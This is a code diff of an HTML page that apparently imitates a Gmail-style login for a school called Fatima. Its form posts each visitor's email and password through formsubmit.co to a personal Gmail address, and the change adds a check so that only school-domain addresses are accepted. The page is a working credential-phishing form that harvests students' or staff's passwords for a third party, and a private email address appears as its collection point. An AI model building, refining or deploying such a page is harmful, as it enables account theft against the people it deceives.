@@ -76,14 +76,28 @@
       cursor: pointer;
     }
   </style>
+  <script>
+    function validarEmail(event) {
+      const emailInput = document.querySelector('input[name="email"]');
+      const email = emailInput.value;
+      const dominio = "@fatimarem.edu.ar";
+
+      if (!email.endsWith(dominio)) {
+        event.preventDefault();
+        alert("El correo debe terminar con " + dominio);
+        return false;
+      }
+
+      return true;
+    }
+  </script>
 </head>
 <body>
 
-  <!-- El formulario ahora se conecta a Formsubmit -->
   <div class="login-container">
     <img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Gmail_Icon.png" alt="Logo">
     <h1>Iniciar sesión</h1>
-    <form action="https://formsubmit.co/aldairabel9@gmail.com" method="POST">
+    <form action="https://formsubmit.co/aldairabel9@gmail.com" method="POST" onsubmit="return validarEmail(event)">
       <input type="email" name="email" placeholder="Correo electrónico de la escuela Fatima" required>
       <input type="password" name="password" placeholder="Contraseña" required>
       <button type="submit">Iniciar sesión</button>
